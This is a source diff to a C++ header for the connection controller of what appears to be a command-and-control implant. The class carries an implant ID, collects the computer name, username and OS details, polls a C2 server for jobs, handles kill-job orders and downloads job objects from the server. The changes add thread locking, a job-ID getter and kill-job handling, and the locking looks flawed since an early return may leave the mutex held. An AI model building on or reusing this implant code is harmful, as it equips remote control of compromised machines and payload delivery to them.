@@ -1,18 +1,20 @@
 #include "stdafx.h"
 
-#include "HttpRequest.hpp"
-#include "JSONParser.h"
-#include "C2Config.h"
-#include "ServerResponse.h"
-#include "ObjectLoader.h"
 
 using namespace std;
 
 #ifndef CONNECTION_CONTROLLER_H
 #define CONNECTION_CONTROLLER_H
 
+#include "HttpRequest.hpp"
+#include "JSONParser.h"
+#include "C2Config.h"
+#include "ServerResponse.h"
+#include "ObjectLoader.h"
+
 class ConnectionController {
 private:
+    pthread_mutex_t mutex; // Mutex object for when CC is used in a thread.
     const char* IMPLANT_ID = "FAKE_ID";
     string computername, username, osInfo;
     string JOB_ID = "NO_JOB";
@@ -158,6 +160,9 @@ public:
             this->JOB_ID = json::getStr("id", responseBody);
             this->OBJECT_SIZE = json::getInt("size", responseBody);
         }
+        else if (code == RESPONSE_KILL_JOB) {
+            this->JOB_ID = json::getStr("jobId", responseBody);
+        }
 
         return code;
     }
@@ -179,8 +184,15 @@ public:
         return json::getInt("code", responseBody);
     }
 
+    // Getter for job ID.
+    string getJobId() {
+        return this->JOB_ID;
+    }
+
     // Retrieves the actual object from the server.
     bool getObject(ObjectLoader *loader) {
+
+        pthread_mutex_lock(&mutex);
 
         if (this->OBJECT_SIZE <= 0 || this->JOB_ID.length() == 0) {
             printf("No job available currently!\n");
@@ -194,7 +206,10 @@ public:
         }
 
         // Load object data to object loader.
-        return downloadFile(prepareJobURL(), loader);
+        bool downloaded = downloadFile(prepareJobURL(), loader);
+
+        pthread_mutex_unlock(&mutex);
+        return downloaded;
     }
 };
 
